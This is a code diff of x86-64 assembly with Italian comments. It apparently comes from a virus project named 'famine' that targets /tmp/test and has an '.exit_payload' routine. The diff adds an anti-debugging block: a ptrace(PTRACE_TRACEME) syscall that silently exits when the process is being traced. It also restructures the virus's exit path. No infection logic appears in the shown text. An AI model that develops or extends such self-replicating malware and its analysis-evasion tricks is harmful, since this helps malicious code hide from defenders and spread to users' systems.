@@ -63,6 +63,24 @@ _start:
     endstruc
 
     mov rbp, rsp                      ; salvo stato attuale stack
+
+    ; ----------------------- Anti-Debug -----------------------
+    mov rax, 101                      ; ptrace
+    mov rdi, 0                        ; PTRACE_TRACEME
+    mov rsi, 0
+    mov rdx, 1
+    mov r10, 0
+    syscall
+    cmp rax, 0
+    jnl .pass
+
+    mov rax, 60
+    mov rdi, 0
+    syscall
+
+    .pass:
+    ; ----------------------------------------------------------
+
     sub rsp, 16                       ; riservo spazio per /tmp/test
     mov dword [rsp+8], `t/\0\0`
     mov dword [rsp+4], '/tes'
@@ -357,10 +375,11 @@ exit:
     cmp rax, 0                        ; se non si tratta di 'famine'
     jne .exit_payload                 ; allora .exit_payload
 
-    mov rsp, rbp                      ; ripristino lo stack
-    mov rdi, 0                        ; error code
-    mov rax, 60
-    syscall
+    .exit_famine:
+        mov rsp, rbp                      ; ripristino lo stack
+        mov rdi, 0                        ; error code
+        mov rax, 60
+        syscall
 
     .exit_payload:
         mov rsp, rbp                  ; ripristino lo stack
